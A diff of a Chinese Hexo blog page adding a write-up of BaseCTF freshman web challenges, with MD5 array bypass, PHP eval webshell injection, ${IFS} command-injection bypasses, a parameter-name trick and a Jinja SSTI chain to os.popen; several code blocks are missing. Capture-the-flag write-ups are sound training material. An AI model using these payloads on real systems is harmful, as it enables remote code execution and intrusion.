@@ -10,9 +10,13 @@
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
     <meta name="google" content="notranslate" />
     <meta name="keywords" content="Fechin,"> 
-    <meta name="description" content="
+    <meta name="description" content="[Week1] A Dark Room
+[Week1] HTTP 是什么呀根据题目要求改报文的头部和传递参数
+其中：X-Forwarded-For 表示假的
 
-"> 
+进入下个页面
+
+表示考虑到是藏东西，可,"> 
     <meta name="author" content="John Doe"> 
     <link rel="alternative" href="atom.xml" title="Hexo" type="application/atom+xml"> 
     <link rel="icon" href="/img/favicon.png"> 
@@ -21,9 +25,13 @@
     
     <meta name="twitter:card" content="summary"/>
     <meta name="twitter:title" content="高校联合新生赛 - Hexo"/>
-    <meta name="twitter:description" content="
+    <meta name="twitter:description" content="[Week1] A Dark Room
+[Week1] HTTP 是什么呀根据题目要求改报文的头部和传递参数
+其中：X-Forwarded-For 表示假的
 
-"/>
+进入下个页面
+
+表示考虑到是藏东西，可,"/>
     
     
     
@@ -31,9 +39,13 @@
     <meta property="og:site_name" content="Hexo"/>
     <meta property="og:type" content="object"/>
     <meta property="og:title" content="高校联合新生赛 - Hexo"/>
-    <meta property="og:description" content="
+    <meta property="og:description" content="[Week1] A Dark Room
+[Week1] HTTP 是什么呀根据题目要求改报文的头部和传递参数
+其中：X-Forwarded-For 表示假的
 
-"/>
+进入下个页面
+
+表示考虑到是藏东西，可,"/>
     
 <link rel="stylesheet" href="/css/diaspora.css">
 
@@ -73,8 +85,112 @@
 
         </div>
         <div class="content markdown">
-            <p><img src="/%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E6%96%B0%E7%94%9F%E8%B5%9B/QQ%E5%9B%BE%E7%89%8720240103221231-1727356128855-4.jpg" alt="士大夫"></p>
-<p><img src="/%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E6%96%B0%E7%94%9F%E8%B5%9B/image-20240926211130401.png" alt="image-20240926211130401"></p>
+            <h4 id="Week1-A-Dark-Room"><a href="#Week1-A-Dark-Room" class="headerlink" title="[Week1] A Dark Room"></a>[Week1] A Dark Room</h4><p><img src="/img/1727357695288-33.png" alt="img"></p>
+<h4 id="Week1-HTTP-是什么呀"><a href="#Week1-HTTP-是什么呀" class="headerlink" title="[Week1] HTTP 是什么呀"></a>[Week1] HTTP 是什么呀</h4><p>根据题目要求改报文的头部和传递参数</p>
+<p>其中：X-Forwarded-For 表示假的</p>
+<p><img src="/img/1727357695277-6.png" alt="img"></p>
+<p>进入下个页面</p>
+<p><img src="/img/1727357695277-7.png" alt="img"></p>
+<p>表示考虑到是藏东西，可以从报文，隐藏的不显示的报文，目录扫描</p>
+<p><img src="/img/1727357695277-8.png" alt="img"></p>
+<p>flag&#x3D;QmFzZUNURns0YTJkZGYwNi0yMDE2LTQ5OTMtYjg0Ni1jOWZmMDhmZTk1ODF9Cg&#x3D;&#x3D;</p>
+<p>Base64 解码即可</p>
+<p><img src="/img/1727357695277-9.png" alt="img"></p>
+<h4 id="Week1-md5绕过欸"><a href="#Week1-md5绕过欸" class="headerlink" title="[Week1] md5绕过欸"></a>[Week1] md5绕过欸</h4><p>数组绕过是最常见最有用的</p>
+<p>也可以强碰撞（通用）</p>
+<p><img src="/img/1727357695278-10.png" alt="img"></p>
+<h4 id="Week1-喵喵喵´•ﻌ•"><a href="#Week1-喵喵喵´•ﻌ•" class="headerlink" title="[Week1] 喵喵喵´•ﻌ•&#96;"></a>[Week1] 喵喵喵´•ﻌ•&#96;</h4><p>rce 因为是$_GET提交，可以传入木马</p>
+<p><img src="/img/1727357695278-11.png" alt="img"></p>
+<p><a target="_blank" rel="noopener" href="http://challenge.basectf.fun:48042/?DT=eval($_POST%5Ba%5D)">http://challenge.basectf.fun:48042/?DT=eval($_POST[a])</a>;</p>
+<p>a</p>
+<p><img src="/img/1727357695278-12.png" alt="img"></p>
+<p>得到</p>
+<p><img src="/img/1727357695278-13.png" alt="img"></p>
+<p>flag</p>
+<h4 id="Week2-ez-ser"><a href="#Week2-ez-ser" class="headerlink" title="[Week2] ez_ser"></a>[Week2] ez_ser</h4><p>反序列化</p>
+<p><img src="/img/1727357695278-14.png" alt="img"></p>
+<p>分析：</p>
+<p>暂时无法在飞书文档外展示此内容</p>
+<p>构造链</p>
+<p>暂时无法在飞书文档外展示此内容</p>
+<p><img src="/img/1727357695278-15.png" alt="img"></p>
+<h4 id="Week2-RCEisamazingwithspace"><a href="#Week2-RCEisamazingwithspace" class="headerlink" title="[Week2] RCEisamazingwithspace"></a>[Week2] RCEisamazingwithspace</h4><p>空格绕过</p>
+<p>用${IFS}代替空格</p>
+<p><img src="/img/1727357695278-16.png" alt="img"></p>
+<p>cmd&#x3D;ls${IFS}&#x2F;</p>
+<p>cmd&#x3D;cat${IFS}&#x2F;f*</p>
+<h4 id="Week2-一起吃豆豆"><a href="#Week2-一起吃豆豆" class="headerlink" title="[Week2] 一起吃豆豆"></a><strong>[Week2] 一起吃豆豆</strong></h4><p><img src="/img/1727357695278-17.png" alt="img"></p>
+<p>看js代码</p>
+<p>可以直接找到对应的base64的编码</p>
+<p>QmFzZUNURntKNV9nYW0zXzFzX2Vhc3lfdDBfaDRjayEhfQ&#x3D;&#x3D;</p>
+<h4 id="Week2-你听不到我的声音"><a href="#Week2-你听不到我的声音" class="headerlink" title="[Week2] 你听不到我的声音"></a>[Week2] 你听不到我的声音</h4><p><img src="/img/1727357695278-18.png" alt="img"></p>
+<p>shell_exec(“ “):把字符串当dos命令执行，不返回结果</p>
+<p>可用 &gt; 将结果放到其他文件中</p>
+<p>cmd&#x3D;ls &#x2F;&gt;1.txt</p>
+<p>查看：1.txt</p>
+<p><img src="/img/1727357695279-19.png" alt="img"></p>
+<p>cmd&#x3D;cat &#x2F;&gt;2.txt</p>
+<p>查看：2.txt</p>
+<p><img src="/img/1727357695279-20.png" alt="img"></p>
+<h4 id="Week2-数学大师"><a href="#Week2-数学大师" class="headerlink" title="[Week2] 数学大师"></a>[Week2] 数学大师</h4><p>考python语言</p>
+<p><img src="/img/1727357695279-21.png" alt="img"></p>
+<p>暂时无法在飞书文档外展示此内容</p>
+<p>即可</p>
+<p>注意：**”÷”只能复制**</p>
+<h4 id="Week2-Really-EZ-POP"><a href="#Week2-Really-EZ-POP" class="headerlink" title="[Week2] Really EZ POP"></a>[Week2] Really EZ POP</h4><p>php反序列化</p>
+<p><img src="/img/1727357695279-22.png" alt="img"></p>
+<p>暂时无法在飞书文档外展示此内容</p>
+<p>注意：</p>
+<p><strong>单独设置了 setWord($word)函数，</strong></p>
+<p><strong>因为出现private 变量，private $word需要在操作时需要对$word改变值</strong></p>
+<h4 id="Week3-ez-php-jail"><a href="#Week3-ez-php-jail" class="headerlink" title="[Week3] ez_php_jail"></a>[Week3] ez_php_jail</h4><p><img src="/img/1727357695279-23.png" alt="img"></p>
+<p>在源码找到一段base64编码的文字</p>
+<p><img src="/img/1727357695279-24.png" alt="img"></p>
+<p>解码后：</p>
+<p>ph0_info_Like_jail.php</p>
+<p><img src="/img/1727357695280-25.png" alt="img"></p>
+<p>看到禁止的函数</p>
+<p>传Jail_by.Happy值，发现传不了</p>
+<p>因为当 php 版本⼩于 8 时，GET 请求的参数名含有 . ，会被转为 _ ，但是如果参数名中有 [ ，这个 [ 会被直接转为 _ ，但是后⾯如果有 . ，这个 . 就不会被转为 _ 。</p>
+<p>传Jail[by.Happy</p>
+<p>传highlight_file(glob(“&#x2F;f*”)[0]);</p>
+<p>很难找到急急急</p>
+<p>?Jail[by.Happy&#x3D;highlight_file(glob(“&#x2F;f*”)[0]);</p>
+<p><img src="/img/1727357695280-26.png" alt="img"></p>
+<h4 id="Week3-复读机"><a href="#Week3-复读机" class="headerlink" title="[Week3] 复读机"></a>[Week3] 复读机</h4><p><img src="/img/1727357695280-27.png" alt="img"></p>
+<p>先是ssti,进行绕过</p>
+<p>先bp用字典测试被过滤字符</p>
+<p>暂时无法在飞书文档外展示此内容</p>
+<p>绕过</p>
+<p>暂时无法在飞书文档外展示此内容</p>
+<p>注意print(‘’)中’’不可少 通过’’ 来进行链传递</p>
+<p><img src="/img/1727357695280-28.png" alt="img"></p>
+<p>用脚本找包含os的类???</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>暂时无法在飞书文档外展示此内容</p>
+<p>我的数据找到137</p>
+<p><img src="/img/1727357695280-29.png" alt="img"></p>
+<p>继续链传递</p>
+<p>暂时无法在飞书文档外展示此内容</p>
+<p>进行rce</p>
+<p>暂时无法在飞书文档外展示此内容</p>
+<p><img src="/img/1727357695280-30.png" alt="img"></p>
+<p>没找到–&gt;绕过使用 &#x2F; </p>
+<p>环境变量找 &#x2F; 符号</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BaseCTF&#123;%<span class="keyword">print</span>(<span class="string">&#x27;&#x27;</span>[<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_cl&#x27;</span><span class="string">&#x27;ass_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_ba&#x27;</span><span class="string">&#x27;se_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_subcla&#x27;</span><span class="string">&#x27;sses_&#x27;</span><span class="string">&#x27;_&#x27;</span>]()[<span class="number">137</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_in&#x27;</span><span class="string">&#x27;it_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_glo&#x27;</span><span class="string">&#x27;bals_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;po&#x27;</span><span class="string">&#x27;pen&#x27;</span>](<span class="string">&#x27;ls &#x27;</span>)[<span class="string">&#x27;rea&#x27;</span><span class="string">&#x27;d&#x27;</span>]())%&#125;</span><br></pre></td></tr></table></figure>
+
+<p>暂时无法在飞书文档外展示此内容</p>
+<p><img src="/img/1727357695280-31.png" alt="img"></p>
+<p>有：</p>
+<p> OLDPWD&#x3D;&#x2F;</p>
+<p>于是</p>
+<p>cd $OLDPWD到上级目录，找到flag页面</p>
+<p>cat flag的结果</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BaseCTF&#123;%<span class="keyword">print</span>(<span class="string">&#x27;&#x27;</span>[<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_cl&#x27;</span><span class="string">&#x27;ass_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_ba&#x27;</span><span class="string">&#x27;se_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_subcla&#x27;</span><span class="string">&#x27;sses_&#x27;</span><span class="string">&#x27;_&#x27;</span>]()[<span class="number">137</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_in&#x27;</span><span class="string">&#x27;it_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_glo&#x27;</span><span class="string">&#x27;bals_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;po&#x27;</span><span class="string">&#x27;pen&#x27;</span>](<span class="string">&#x27;ls &#x27;</span>)[<span class="string">&#x27;rea&#x27;</span><span class="string">&#x27;d&#x27;</span>]())%&#125;</span><br></pre></td></tr></table></figure>
+
+<p>暂时无法在飞书文档外展示此内容</p>
+<p><img src="/img/1727357695280-32.png" alt="img"></p>
 
             <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
             <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
